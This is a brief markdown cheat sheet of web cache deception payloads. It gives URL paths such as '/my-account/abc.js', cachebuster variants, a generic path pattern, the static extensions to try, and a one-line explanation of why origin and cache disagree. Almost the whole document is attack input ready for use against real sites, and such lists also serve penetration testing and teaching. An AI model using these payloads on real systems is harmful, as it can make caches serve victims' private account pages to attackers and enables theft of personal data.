# Static Extension Payloads

## Basic

```text
/my-account/abc.js
```

```text
/my-account/abc.css
```

```text
/my-account/abc.ico
```

```text
/my-account/abc.exe
```

---

## Generic Pattern

```text
/<dynamic-endpoint>/<arbitrary-string>.js
```

Example:

```text
/settings/users/list/aaa.js
```

---

## With Cachebuster

```text
/my-account/abc.js?wcd001
```

```text
/my-account/abc.css?wcd002
```

---

## Testing Extensions

```text
.js
.css
.ico
.exe
```

---

## Expected Concept

```text
Origin:
<dynamic-endpoint>

Cache:
<dynamic-endpoint>/<arbitrary-string>.js
```

The technique is useful when the origin ignores or abstracts the added path while the cache applies a static extension rule.